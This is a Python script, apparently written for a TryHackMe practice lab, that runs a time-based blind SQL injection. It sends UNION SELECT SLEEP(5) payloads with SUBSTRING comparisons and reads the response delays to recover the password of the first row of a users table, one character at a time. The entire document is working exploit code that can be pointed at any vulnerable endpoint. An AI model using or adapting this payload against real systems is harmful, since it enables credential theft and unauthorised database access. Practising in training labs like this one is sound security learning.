import requests
import string
import time

url = "http://10-10-155-176.p.thmlabs.com/run"
chars = string.ascii_letters + string.digits + "_@{}!$"
extracted = ""

while True:
    found = False
    for c in chars:
        payload = f"admin123' UNION SELECT SLEEP(5),2 WHERE (SELECT SUBSTRING(password, {len(extracted)+1}, 1) FROM sqli_four.users LIMIT 0,1) = '{c}';--"
        data = {"level": "4", "sql": f"select * from analytics_referrers where domain='{payload}'"}
        t1 = time.time()
        r = requests.post(url, data=data)
        t2 = time.time()

        if t2 - t1 > 4.5:
            extracted += c
            print(f"[+] Found so far: {extracted}")
            found = True
            break

    if not found:
        print(f"[✓] Extraction complete: {extracted}")
        break

